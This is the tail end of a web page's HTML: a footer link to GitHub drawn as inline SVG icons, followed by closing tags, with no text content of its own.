GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>
